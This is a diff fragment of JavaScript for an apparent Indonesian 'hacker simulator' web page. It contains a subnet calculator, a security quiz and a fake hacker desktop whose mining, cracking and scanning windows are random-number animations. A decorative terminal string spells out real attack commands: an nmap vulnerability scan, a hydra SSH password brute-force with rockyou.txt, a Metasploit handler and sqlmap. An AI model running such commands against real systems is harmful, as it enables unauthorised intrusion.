+$('#uuidCopy').onclick = function(){ if(navigator.clipboard) navigator.clipboard.writeText($('#uuidOut').textContent); toast('📋 Copied!'); };
+$('#ipCalc').onclick = function(){
+  S.click();
+  const v = $('#ipIn').value.trim();
+  const m = v.match(/^(\d+\.\d+\.\d+\.\d+)\/(\d+)$/);
+  if(!m){ $('#ipOut').textContent = 'Format salah'; return; }
+  const ip = m[1], cidr = parseInt(m[2]);
+  if(cidr < 0 || cidr > 32){ $('#ipOut').textContent = 'CIDR 0-32'; return; }
+  const toInt = function(s){ return s.split('.').reduce(function(a,x){ return ((a << 8) >>> 0) + parseInt(x); }, 0) >>> 0; };
+  const toIP = function(n){ return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join('.'); };
+  const mask = cidr === 0 ? 0 : (0xFFFFFFFF << (32 - cidr)) >>> 0;
+  const net = (toInt(ip) & mask) >>> 0;
+  const bcast = (net | (~mask >>> 0)) >>> 0;
+  const total = Math.pow(2, 32 - cidr);
+  const usable = cidr >= 31 ? total : total - 2;
+  $('#ipOut').innerHTML = '<b>Network:</b> ' + toIP(net) + '<br><b>Broadcast:</b> ' + toIP(bcast) + '<br><b>Netmask:</b> ' + toIP(mask) + '<br><b>First:</b> ' + (cidr >= 31 ? toIP(net) : toIP((net+1) >>> 0)) + '<br><b>Last:</b> ' + (cidr >= 31 ? toIP(bcast) : toIP((bcast-1) >>> 0)) + '<br><b>Total:</b> ' + total.toLocaleString() + '<br><b>Usable:</b> ' + usable.toLocaleString();
+  unlock('🌐','Subnet Ninja');
+};
+$('#numConv').onclick = function(){
+  S.click();
+  const n = $('#numIn').value.trim();
+  const from = parseInt($('#numFrom').value);
+  const num = parseInt(n, from);
+  if(isNaN(num)){ $('#numOut').textContent = 'Angka tidak valid'; return; }
+  $('#numOut').innerHTML = '<b>Decimal:</b> ' + num + '<br><b>Binary:</b> ' + num.toString(2) + '<br><b>Octal:</b> ' + num.toString(8) + '<br><b>Hex:</b> 0x' + num.toString(16).toUpperCase() + '<br><b>Base36:</b> ' + num.toString(36).toUpperCase();
+};
+$('#numIn').oninput = function(){ $('#numConv').click(); };
+hashGen();
+$('#numConv').click();
+
+/* CTF */
+const QUIZ = [
+  {q:'Kepanjangan <code>XSS</code>?',o:['Cross-Site Scripting','eXtreme Security System','XML Socket','eXternal Shell'],a:0,t:'XSS = Cross-Site Scripting.'},
+  {q:'Chmod untuk <code>rwxr-xr-x</code>?',o:['755','644','777','600'],a:0,t:'755 = owner rwx, group r-x.'},
+  {q:'Port default HTTPS?',o:['80','443','8080','22'],a:1,t:'HTTP=80, HTTPS=443, SSH=22.'},
+  {q:'Hash paling aman?',o:['MD5','SHA-1','SHA-256','CRC32'],a:2,t:'MD5 & SHA-1 deprecated.'},
+  {q:'Fungsi <code>nmap -sS</code>?',o:['UDP scan','SYN stealth','Service','OS'],a:1,t:'-sS = SYN half-open scan.'},
+  {q:'Base64 dari "Hi"?',o:['SGk=','SGk','SGk==','aGk='],a:0,t:'Hi → hex 4869 → SGk='},
+  {q:'<code>/etc/passwd</code> berisi?',o:['Password hash','Daftar user','Log','Kernel'],a:1,t:'Password asli di /etc/shadow.'},
+  {q:'SQL Injection adalah?',o:['Serangan DB via input','Virus','Enkripsi','Backup'],a:0,t:'SQLi = sisipkan query SQL.'},
+  {q:'Setup storage Termux?',o:['termux-setup','termux-storage','termux-setup-storage','storage-setup'],a:2,t:'termux-setup-storage minta izin.'},
+  {q:'Phishing artinya?',o:['DDoS','Penipuan via link palsu','WiFi','Enkripsi'],a:1,t:'Phishing = menipu korban.'}
+];
+let ctfIdx = 0, ctfScore = 0, ctfAnswered = false;
+function renderCTF(){
+  const card = $('#ctfCard');
+  if(ctfIdx >= QUIZ.length){
+    const pct = Math.round((ctfScore / QUIZ.length) * 100);
+    let rank, rc;
+    if(pct >= 90){ rank = '🏆 ELITE'; rc = 'var(--warning)'; }
+    else if(pct >= 70){ rank = '🥇 ADVANCED'; rc = 'var(--accent)'; }
+    else if(pct >= 50){ rank = '🥈 INTERMEDIATE'; rc = 'var(--primary)'; }
+    else { rank = '🥉 BEGINNER'; rc = 'var(--dim)'; }
+    card.innerHTML = '<div class="ctf-done"><h3>CHALLENGE COMPLETE</h3><div class="rank" style="color:' + rc + '">' + rank + '</div><p>Skor: <b style="color:var(--primary);font-size:18px">' + ctfScore + '/' + QUIZ.length + '</b> (' + pct + '%)</p><div class="ctf-actions" style="justify-content:center"><button class="util-btn" id="ctfRestart">🔄 ULANGI</button></div></div>';
+    $('#ctfRestart').onclick = function(){ S.click(); ctfIdx = 0; ctfScore = 0; ctfAnswered = false; renderCTF(); updateCTF(); };
+    if(pct >= 70) unlock('🎯','CTF Challenger');
+    if(pct === 100) unlock('💎','Perfect Score!','LEGENDARY');
+    updateCTF();
+    return;
+  }
+  const q = QUIZ[ctfIdx];
+  ctfAnswered = false;
+  let optsHtml = '';
+  for(let i=0;i<q.o.length;i++){
+    optsHtml += '<button class="ctf-opt" data-i="' + i + '"><span class="letter">' + String.fromCharCode(65+i) + '</span> ' + q.o[i] + '</button>';
+  }
+  card.innerHTML = '<div class="ctf-q-num">SOAL ' + (ctfIdx+1) + ' / ' + QUIZ.length + '</div><div class="ctf-q">' + q.q + '</div><div class="ctf-opts">' + optsHtml + '</div><div class="ctf-feedback" id="ctfFb"></div><div class="ctf-actions"><button class="util-btn" id="ctfNext" style="display:none">SOAL BERIKUT ▶</button></div>';
+  $$('.ctf-opt').forEach(function(b){ b.onclick = function(){ answerCTF(parseInt(b.dataset.i)); }; });
+  $('#ctfNext').onclick = function(){ S.click(); ctfIdx++; renderCTF(); };
+  updateCTF();
+}
+function answerCTF(p){
+  if(ctfAnswered) return;
+  ctfAnswered = true;
+  const q = QUIZ[ctfIdx];
+  const opts = $$('.ctf-opt');
+  opts.forEach(function(o){ o.disabled = true; });
+  opts[q.a].classList.add('correct');
+  if(p === q.a){
+    ctfScore++;
+    S.ok();
+    $('#ctfFb').className = 'ctf-feedback ok show';
+    $('#ctfFb').innerHTML = '✅ <b>BENAR!</b><br>' + q.t;
+  } else {
+    opts[p].classList.add('wrong');
+    S.err();
+    $('#ctfFb').className = 'ctf-feedback no show';
+    $('#ctfFb').innerHTML = '❌ <b>SALAH.</b> Jawaban: <b>' + String.fromCharCode(65 + q.a) + '</b><br>' + q.t;
+  }
+  $('#ctfNext').style.display = 'inline-block';
+  updateCTF();
+  if(ctfScore === 1) unlock('🎯','First Blood');
+  if(ctfScore === 5) unlock('🔥','Halfway Hero');
+}
+function updateCTF(){
+  $('#ctfScore').textContent = ctfScore;
+  $('#ctfProgress').textContent = Math.min(ctfIdx+1, QUIZ.length) + '/' + QUIZ.length;
+  const an = ctfIdx + (ctfAnswered ? 1 : 0);
+  $('#ctfAcc').textContent = an > 0 ? Math.round((ctfScore/an) * 100) + '%' : '--';
+}
+renderCTF();
+
+/* ACHIEVEMENT */
+const ACH = {unlocked:{}, queue:[]};
+function unlock(icon, name, type){
+  type = type || 'ACHIEVEMENT UNLOCKED';
+  if(ACH.unlocked[name]) return;
+  ACH.unlocked[name] = true;
+  ACH.queue.push({icon:icon, name:name, type:type});
+  if(ACH.queue.length === 1) showNextAch();
+}
+function showNextAch(){
+  if(!ACH.queue.length) return;
+  const a = ACH.queue[0];
+  $('#achIcon').textContent = a.icon;
+  $('#achName').textContent = a.name;
+  $('#achType').textContent = a.type;
+  $('#achToast').classList.add('show');
+  S.ok();
+  setTimeout(function(){
+    $('#achToast').classList.remove('show');
+    setTimeout(function(){ ACH.queue.shift(); showNextAch(); }, 500);
+  }, 3000);
+}
+setTimeout(function(){ unlock('🎓','Welcome Operator','SYSTEM INITIALIZED'); }, 2500);
+
+/* HACKER DESKTOP */
+const HD = {active:false, inited:false};
+const HD_CODE = 'import socket\nfrom cryptography.fernet import Fernet\nclass ExploitFramework:\n    def __init__(self, target_ip, port=443):\n        self.target=target_ip\n$ nmap -sS -p- -T4 --script vuln 192.168.1.0/24\n$ hydra -l admin -P rockyou.txt 10.0.42.1 ssh\n$ msfconsole -x "use exploit/multi/handler"\n$ sqlmap -u "http://target/?id=1" --dbs\nDECRYPTING: 100% — ACCESS GRANTED\n';
+function openDesktop(){
+  S.init(); S.click();
+  document.body.classList.add('locked');
+  $('#hdesk').classList.add('active');
+  HD.active = true;
+  if(!HD.inited){
+    HD.inited = true;
+    initHDDock();
+    startHDTyping();
+    startHDPassive();
+  }
+}
+function closeDesktop(){
+  S.click();
+  document.body.classList.remove('locked');
+  $('#hdesk').classList.remove('active');
+  HD.active = false;
+}
+window.openDesktop = openDesktop;
+window.closeDesktop = closeDesktop;
+setInterval(function(){
+  const c = $('#hdClock'); if(c) c.textContent = new Date().toLocaleTimeString('id-ID');
+  const cp = $('#hdCpu'); if(cp) cp.textContent = ri(8,78) + '%';
+}, 1000);
+function startHDTyping(){
+  const el = $('#hdTerm');
+  let i = 0;
+  const full = HD_CODE.repeat(3);
+  function tick(){
+    if(!HD.active){ setTimeout(tick, 500); return; }
+    const chunk = full.slice(i, i + ri(1,3));
+    el.textContent += chunk;
+    i += chunk.length;
+    if(i > full.length - 10){ i = 0; el.textContent = ''; }
+    if(el.textContent.length > 2500) el.textContent = el.textContent.slice(-2000);
+    el.scrollTop = el.scrollHeight;
+    setTimeout(tick, ri(20,60));
+  }
+  tick();
+}
+const HD_PROGRAMS = [
+  {ico:'₿', lbl:'BITCOIN', num:'1', open:hdBitcoin},
+  {ico:'🔐', lbl:'CRACK', num:'2', open:hdCrack},
+  {ico:'☢️', lbl:'NUKE', num:'3', open:hdNuke},
+  {ico:'🕵️', lbl:'INTERPOL', num:'4', open:hdInterpol},
+  {ico:'🛰️', lbl:'SAT', num:'5', open:hdSatellite},
+  {ico:'💰', lbl:'DEALS', num:'6', open:hdDeals},
+  {ico:'📡', lbl:'SCAN', num:'7', open:hdScan}
+];
+const hdMap = {};
+function initHDDock(){
+  const d = $('#hdDock');
+  d.innerHTML = '';
+  HD_PROGRAMS.forEach(function(p){
+    const el = document.createElement('div');
+    el.className = 'hd-icon';
+    el.innerHTML = '<span class="ico">' + p.ico + '</span><span class="lbl">' + p.lbl + '</span><span class="hd-num">' + p.num + '</span>';
+    el.onclick = function(){ S.click(); p.open(); };
+    d.appendChild(el);
+    hdMap[p.num] = p.open;
+  });
+}
+const HD_MSGS = [
+  {t:'ACCESS DENIED', s:'Insufficient privileges', d:true},
+  {t:'ACCESS GRANTED', s:'Welcome, operator', d:false},
+  {t:'WARNING', s:'Self-destruct...', d:true},
+  {t:'NEURAL TRACE', s:'Tracing origin...', d:false},
+  {t:'SATELLITE LOCK', s:'Target acquired', d:false},
+  {t:'ENCRYPTING', s:'AES-256 enabled', d:false},
+  {t:'SYSTEM BREACH', s:'Firewall bypassed', d:true},
+  {t:'VPN ACTIVE', s:'Location: Unknown', d:false}
+];
+function hdPopup(m, denied){
+  const p = $('#hPopup');
+  $('#hPopTitle').textContent = m.t;
+  $('#hPopSub').textContent = m.s;
+  p.classList.toggle('denied', !!denied);
+  p.classList.add('show');
+  if(denied) S.err(); else S.ok();
+  clearTimeout(p._t);
+  p._t = setTimeout(function(){ p.classList.remove('show'); }, 1800);
+}
+function startHDPassive(){
+  window.addEventListener('keydown', function(e){
+    if(!HD.active) return;
+    if(e.key >= '0' && e.key <= '9'){
+      if(e.key === '0') hdPopup({t:'SYSTEM LOCKED', s:'Press SPACE'}, true);
+      else hdPopup(HD_MSGS[(parseInt(e.key)-1) % HD_MSGS.length], Math.random() > .5);
+    }
+    if(e.key === ' ') $('#hPopup').classList.remove('show');
+    if(hdMap[e.key]){ S.click(); hdMap[e.key](); }
+  });
+}
+let hZ = 300;
+function makeHWin(title, html, opts){
+  opts = opts || {};
+  const w = document.createElement('div');
+  w.className = 'hwin';
+  w.style.zIndex = ++hZ;
+  const width = Math.min(opts.w || 300, window.innerWidth - 30);
+  const off = (hZ % 5) * 20;
+  w.style.left = Math.max(10, (window.innerWidth - width)/2 - 60 + off) + 'px';
+  w.style.top = Math.max(60, window.innerHeight/2 - 150 + off) + 'px';
+  w.style.width = width + 'px';
+  w.innerHTML = '<div class="hwin-head"><div class="hwin-title">' + title + '</div><button class="hwin-close">✕</button></div><div class="hwin-body">' + html + '</div>';
+  $('#hdesk').appendChild(w);
+  w.querySelector('.hwin-close').onclick = function(){ S.click(); w.remove(); };
+  const head = w.querySelector('.hwin-head');
+  let dr = false, sx = 0, sy = 0, ox = 0, oy = 0;
+  const start = function(x, y){ dr = true; sx = x; sy = y; ox = w.offsetLeft; oy = w.offsetTop; w.style.zIndex = ++hZ; };
+  const move = function(x, y){ if(!dr) return; w.style.left = (ox + x - sx) + 'px'; w.style.top = Math.max(30, oy + y - sy) + 'px'; };
+  const end = function(){ dr = false; };
+  head.addEventListener('mousedown', function(e){ if(e.target.closest('.hwin-close')) return; start(e.clientX, e.clientY); });
+  head.addEventListener('touchstart', function(e){ const t = e.touches[0]; start(t.clientX, t.clientY); }, {passive:true});
+  document.addEventListener('mousemove', function(e){ move(e.clientX, e.clientY); });
+  document.addEventListener('touchmove', function(e){ const t = e.touches[0]; move(t.clientX, t.clientY); }, {passive:true});
+  document.addEventListener('mouseup', end);
+  document.addEventListener('touchend', end);
+  w.addEventListener('mousedown', function(){ w.style.zIndex = ++hZ; });
+  return w;
+}
+function hdBitcoin(){
+  const w = makeHWin('₿ BITCOIN MINER', '<div>Status: <span style="color:var(--primary)">MINING</span></div><div class="btc-value" id="btcVal">0.00000000 BTC</div><div>Hash: <span id="hRate">0 H/s</span></div><div class="prog-bar"><div class="prog-fill" id="btcProg"></div></div><div class="hash-stream" id="hStream"></div>', {w:300});
+  let btc = 0;
+  const t = setInterval(function(){
+    if(!document.body.contains(w)){ clearInterval(t); return; }
+    btc += r(.00000001, .00000008);
+    w.querySelector('#btcVal').textContent = btc.toFixed(8) + ' BTC';
+    w.querySelector('#hRate').textContent = ri(1200, 4800) + ' H/s';
+    w.querySelector('#btcProg').style.width = ((btc*5000) % 100) + '%';
+    const h = Array.from({length:32}, function(){ return ri(0,15).toString(16); }).join('');
+    const s = w.querySelector('#hStream');
+    s.textContent = (h + '\n' + s.textContent).slice(0, 300);
+  }, 500);
+}
+function hdCrack(){
+  const w = makeHWin('🔐 PASSWORD CRACKER', '<div>Target: <span style="color:var(--accent)">admin@10.0.42.1</span></div><div style="margin-top:6px">Progress: <span id="cPct">0%</span></div><div class="prog-bar"><div class="prog-fill" id="cProg"></div></div><div>Attempts: <span id="cAtt">0</span></div><div class="crack-log" id="cLog"></div>', {w:320});
+  let pct = 0, att = 0;
+  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+  const t = setInterval(function(){
+    if(!document.body.contains(w)){ clearInterval(t); return; }
+    pct = Math.min(100, pct + r(2,8));
+    att += ri(1000, 9000);
+    w.querySelector('#cPct').textContent = Math.floor(pct) + '%';
+    w.querySelector('#cProg').style.width = pct + '%';
+    w.querySelector('#cAtt').textContent = att.toLocaleString();
+    const a = Array.from({length:8}, function(){ return pk(chars.split('')); }).join('');
+    const l = w.querySelector('#cLog');
+    l.textContent = ('trying: ' + a + '\n' + l.textContent).slice(0, 500);
+    if(pct >= 100){ clearInterval(t); l.textContent = '✓ PASSWORD: h4ckm3_2025\n' + l.textContent; }
+  }, 250);
+}
+function hdNuke(){
+  const w = makeHWin('☢️ NUCLEAR', '<div style="font-size:10px;color:var(--warning);margin-bottom:8px">⚠ HIGH SECURITY FACILITY</div><div style="display:flex;gap:14px;align-items:center"><div class="nuke-circle" id="nVal">3</div><div><div style="font-size:10px;color:var(--warning)">REACTOR 1 — STABLE</div><div style="font-size:10px;color:var(--warning)">REACTOR 2 — STABLE</div><div style="font-size:10px;color:var(--warning)">REACTOR 3 — <span style="color:var(--danger)">WARNING</span></div></div></div><div style="margin-top:8px">Core: <span id="nTemp" style="color:var(--warning)">842°C</span></div><div class="prog-bar"><div class="prog-fill" id="nBar" style="background:linear-gradient(90deg,var(--warning),var(--danger))"></div></div>', {w:320});
+  const t = setInterval(function(){
+    if(!document.body.contains(w)){ clearInterval(t); return; }
+    const temp = ri(800, 1200);
+    w.querySelector('#nTemp').textContent = temp + '°C';
+    w.querySelector('#nBar').style.width = ((temp-800)/4) + '%';
+    w.querySelector('#nVal').textContent = ri(1,5);
+  }, 800);
+}
+function hdInterpol(){
+  const em = ['👤','👥','🕶️','🎭','👨','👩','🧑','👴','👵'];
+  const faces = Array.from({length:9}, function(){ return pk(em); });
+  const mi = ri(0, 8);
+  let grid = '';
+  for(let i=0;i<9;i++) grid += '<div class="face" data-i="' + i + '">' + faces[i] + '</div>';
+  const w = makeHWin('🕵️ INTERPOL', '<div style="font-size:10px">Searching: <span style="color:var(--accent)">"target-7734"</span></div><div class="face-grid">' + grid + '</div><div style="margin-top:8px;font-size:10px" id="iMsg">Menunggu hasil...</div>', {w:300});
+  setTimeout(function(){
+    if(!document.body.contains(w)) return;
+    const t = w.querySelector('[data-i="' + mi + '"]');
+    if(t){ t.classList.add('matched'); t.textContent = '❗'; }
+    w.querySelector('#iMsg').innerHTML = '<span style="color:var(--danger)">MATCH FOUND — ID #7734</span>';
+  }, 2500);
+}
+function hdSatellite(){
+  const w = makeHWin('🛰️ SATELLITE', '<div style="font-size:10px">TARGET: <span style="color:var(--accent)" id="sTgt">--</span></div><div style="font-size:10px">LAT/LON: <span id="sCoord">--</span></div><div class="sat-map" id="sMap"><div class="grid-lines"></div></div>', {w:320});
+  const map = w.querySelector('#sMap');
+  w.querySelector('#sTgt').textContent = pk(['Tokyo','Berlin','London','NY','Dubai','SG','Moscow']);
+  const upd = function(){
+    if(!document.body.contains(w)){ clearInterval(t); return; }
+    w.querySelector('#sCoord').textContent = r(-90,90).toFixed(4) + ', ' + r(-180,180).toFixed(4);
+    const dot = document.createElement('div');
+    dot.className = 'sat-dot';
+    dot.style.left = ri(10,90) + '%';
+    dot.style.top = ri(10,90) + '%';
+    map.appendChild(dot);
+    setTimeout(function(){ dot.remove(); }, 1500);
+  };
+  upd();
+  const t = setInterval(upd, 1200);
+}
+function hdDeals(){
+  const deals = [
+    {n:'VPN Lifetime', p:'$4.99', d:'256-bit encrypted tunnel'},
+    {n:'SSD 2TB', p:'$89.99', d:'NVMe Gen4'},
+    {n:'GPU RTX 5090', p:'$1,499', d:'For crypto mining'},
+    {n:'VPS 8GB', p:'$12/mo', d:'Offshore anonymous'},
+    {n:'0-day exploit', p:'$???', d:'Contact only'}
+  ];
+  makeHWin('💰 SECRET DEALS', '<div style="font-size:9px;color:#888;margin-bottom:8px">// DARK WEB MARKETPLACE (SIMULASI)</div>' + deals.map(function(d){
+    return '<div class="deal-card"><div style="font-size:11px">' + d.n + '</div><div style="font-size:9px;color:#888">' + d.d + '</div><div class="deal-price">' + d.p + '</div></div>';
+  }).join(''), {w:300});
+}
+function hdScan(){
+  const w = makeHWin('📡 NETWORK SCANNER', '<div style="font-size:10px">Scanning: <span style="color:var(--accent)">192.168.1.0/24</span></div><div class="prog-bar"><div class="prog-fill" id="sProg"></div></div><div class="crack-log" id="sLog" style="height:120px"></div>', {w:300});
+  let pct = 0;
+  const log = w.querySelector('#sLog');
+  const t = setInterval(function(){
+    if(!document.body.contains(w)){ clearInterval(t); return; }
+    pct = Math.min(100, pct + r(3,10));
+    w.querySelector('#sProg').style.width = pct + '%';
+    const ip = '192.168.1.' + ri(1,254);
+    const ports = pk(['22/tcp open ssh','80/tcp open http','443/tcp open https','3306/tcp open mysql','8080/tcp open http-proxy']);
+    log.textContent = ('[+] ' + ip + ' → ' + ports + '\n' + log.textContent).slice(0, 600);
+    if(pct >= 100){ clearInterval(t); log.textContent = '[✓] SCAN COMPLETE\n' + log.textContent; }
+  }, 300);
+}
+
+/* PWA */
+(function(){
+  try{
+    const manifest = {
+      name:'AdrianHackMul', short_name:'AHM',
+      description:'Ultimate Hacker Simulator',
+      start_url:location.href, display:'standalone', orientation:'portrait',
+      background_color:'#04060a', theme_color:'#00ff41',
+      icons:[{src:'https://i.ibb.co.com/BH8W8pZ1/cbf7eab0d8f4207ca73e71d69d670f95.jpg', sizes:'512x512', type:'image/jpeg', purpose:'any maskable'}]
+    };
+    const blob = new Blob([JSON.stringify(manifest)], {type:'application/manifest+json'});
+    const link = document.createElement('link');
+    link.rel = 'manifest';
+    link.href = URL.createObjectURL(blob);
+    document.head.appendChild(link);
+  } catch(e){}
+  let deferred;
+  window.addEventListener('beforeinstallprompt', function(e){ e.preventDefault(); deferred = e; const b = $('#installBtn'); if(b) b.classList.add('show'); });
+  const installBtn = $('#installBtn');
+  if(installBtn){
+    installBtn.onclick = async function(){
+      if(!deferred){ toast('⚠ Buka Chrome → menu → Install app'); return; }
+      deferred.prompt();
+      const res = await deferred.userChoice;
+      if(res.outcome === 'accepted'){ toast('✅ Installed!'); installBtn.classList.remove('show'); }
+      deferred = null;
+    };
+  }
+})();
+
+/* KONAMI */
+let kn = [];
+const kk = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a'];
+window.addEventListener('keydown', function(e){
+  kn.push(e.key);
+  kn = kn.slice(-10);
+  if(kn.join() === kk.join()){
+    toast('🎮 KONAMI CODE');
+    S.ok();
+    document.body.dataset.theme = 'purple';
+    if(mx) mx.mode = 'rainbow';
+  }
+});
+document.addEventListener('click', function(){ S.init(); }, {once:true});
+
+/* LIGHTBOX */
+window.openLightbox = function(el){
+  const src = el.getAttribute('data-src') || (el.querySelector('img') && el.querySelector('img').src);
+  if(!src) return;
+  const lb = document.getElementById('lightbox');
+  const img = document.getElementById('lightboxImg');
+  if(lb && img){
+    img.src = src;
+    lb.classList.add('show');
+    document.body.style.overflow = 'hidden';
+  }
+};
+window.closeLightbox = function(e){
+  if(e && e.target && e.target.id === 'lightboxImg') return;
+  const lb = document.getElementById('lightbox');
+  if(lb) lb.classList.remove('show');
+  document.body.style.overflow = '';
+};
+document.addEventListener('keydown', function(e){
+  if(e.key === 'Escape') window.closeLightbox();
+});
+
+console.log('[AdrianHackMul v12] Loaded successfully');
+})();
+</script>
+</body>
+</html>
